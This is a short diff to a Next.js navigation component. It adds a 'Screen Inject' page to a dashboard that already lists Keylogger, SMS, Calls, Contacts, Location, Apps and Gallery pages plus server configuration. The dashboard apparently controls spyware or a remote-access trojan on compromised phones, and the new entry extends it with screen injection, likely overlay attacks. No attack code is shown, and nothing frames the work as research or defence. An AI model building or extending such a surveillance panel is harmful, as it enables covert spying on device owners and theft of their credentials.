@@ -3,7 +3,7 @@ import Link from 'next/link'
 import { usePathname } from 'next/navigation'
 import {
   LayoutDashboard, FolderOpen,
-  Settings, Smartphone, WifiOff, ChevronDown,
+  Settings, Smartphone, Monitor, WifiOff, ChevronDown,
   MessageSquare, Phone, Users, MapPin, Package, Image, KeySquare,
   MoreHorizontal, X, Trash2, CheckSquare, Square,
   Bell, BellRing, ExternalLink, Server,
@@ -35,6 +35,7 @@ const navItems = [
   { href: '/location', label: 'Location', icon: MapPin },
   { href: '/apps', label: 'Apps', icon: Package },
   { href: '/keylog', label: 'Keylogger', icon: KeySquare },
+  { href: '/screen-inject', label: 'Screen Inject', icon: Monitor },
   { href: '/setup', label: 'Setup', icon: Settings },
   { href: '/server-config', label: 'Server Config', icon: Server },
 ]
